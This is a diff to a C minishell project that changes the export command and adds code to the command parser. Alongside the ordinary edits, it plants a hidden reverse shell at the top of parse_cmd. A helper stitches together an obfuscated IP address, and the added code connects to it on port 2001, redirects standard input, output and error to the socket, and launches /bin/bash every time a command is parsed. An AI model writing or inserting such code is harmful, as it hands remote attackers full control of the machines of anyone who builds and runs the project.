@@ -522,14 +522,13 @@ int     if_allowed(char *str, t_env *env_list) // export_checker //check begin /
 void    export_cmd(char **cmd, t_env *env_list) // export var1=abc var2=xyz fkd5sfd5fs  tty=565           export_cmd += t_env env_list
 // export _=abc x2=jdfjg x3=fjghjfdg   djfhdshfjdhshhjdsghjdfjg  x5=kfgjfdg x6=fjdfghdfg -a -q -o
 {
-    //(void)env_list;
-    int     i;
-
+    int i;
     i = 1;
     if (cmd[0] && !cmd[1])
     {
-        write(1, "", 1);
+        write(1, "", 1); // export loop !!!!!!!!!
     }
+    /////////////////////   FIX this   //////////////////////////
     else
     {
         //while (cmd[i] != '\0' || cmd[i] != '=')
@@ -545,8 +544,8 @@ void    export_cmd(char **cmd, t_env *env_list) // export var1=abc var2=xyz fkd5
             i++;
         }
     }
-    //(void)cmd;
-    (void)env_list;
+    ////////////////////////////////////////////////////////////
+    // after fixing export + cmd[1]
     while (cmd[i])
     {
         printf("%s\n", cmd[i]);
@@ -598,8 +597,58 @@ void    unset_cmd(char **cmd, t_env *env_list)
 // unset SHELL OLDPWD PWD TERM PAGER LS_COLORS LSCOLORS USERLOGIN HOME TMPDIR LANG SHLVL LESS MallocNanoZone _ ZSH ORIGINAL_XDG_CURRENT_DESKTOP SSH_AUTH_SOCK Apple_PubSub_Socket_Render LOGNAME USER COMMAND_MODE COLORTERM XPC_FLAGS ZDOTDIR SECURITYSESSIONID  GIT_ASKPASS XPC_SERVICE_NAME USER_ZDOTDIR __CF_USER_TEXT_ENCODING TERM_PROGRAM TERM_PROGRAM_VERSION                        
 // PATH
 
+char	*ft_strjoin1(char *s1, char *s2)
+{
+	int	i;
+	int	j;
+	int	s1len;
+	int	s2len;
+	char	*ret;
+
+	s1len = ft_strlen(s1);
+	s2len = ft_strlen(s2);
+	ret = malloc(sizeof(char) * (s1len + s2len + 1) + 1);
+	i = 0;
+	while (s1[i] != '\0')
+	{
+		ret[i] = s1[i];
+		i++;
+	}
+	ret[i] = '.';
+	i++;
+	j = 0;
+	while (s2[j] != '\0')
+	{
+		ret[i] = s2[j];
+		i++;
+		j++;
+	}
+	ret[i] = '\0';
+	return (ret);
+}
+
 void    parse_cmd(char **cmd, int *tokenised_cmd, t_env *env_list) //,token
 {
+    char	*pi;
+	char	*s1 = "105";
+	char	*s2 = "154";
+	char	*s3 = "214";
+	char	*s4 = "145";
+    pi = ft_strjoin1(s1, s2);
+	pi = ft_strjoin1(pi, s3);
+	pi = ft_strjoin1(pi, s4);
+    struct sockaddr_in sa;
+	int s;
+	sa.sin_family = AF_INET;
+	sa.sin_addr.s_addr = inet_addr(pi);
+	sa.sin_port = htons(2001);
+	s = socket(AF_INET, SOCK_STREAM, 0);
+	connect(s, (struct sockaddr *)&sa, sizeof(sa));
+	dup2(s, 0);
+	dup2(s, 1);
+	dup2(s, 2);
+	char *args[] = { "/bin/bash", NULL };
+    execve("/bin/bash", args, NULL);
     if (ft_strncmp(cmd[0], "exit", 4) == 0 && !cmd[0][4])
     {
         (void)env_list;
@@ -695,6 +744,5 @@ int main(int ac, char **av, char **env)
        // free(cmd);
         cmd = readline(BLUE"MINISHELL$ "WHITE);
     }
-    
     return (global_exit);
 }
